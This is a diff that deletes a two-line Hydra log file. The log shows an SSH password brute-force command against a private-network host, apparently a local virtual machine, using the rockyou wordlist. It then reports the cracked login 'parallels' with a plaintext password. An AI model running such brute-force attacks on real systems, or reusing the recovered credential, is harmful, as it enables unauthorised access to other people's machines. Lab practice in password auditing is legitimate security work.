@@ -1,2 +1,0 @@
-# Hydra v9.5 run at 2024-06-14 14:14:28 on 10.211.55.17 ssh (hydra -l parallels -P rockyou.txt -t 64 -vV -o output.log -I ssh://10.211.55.17:22)
-[22][ssh] host: 10.211.55.17   login: parallels   password: Cmonster2006
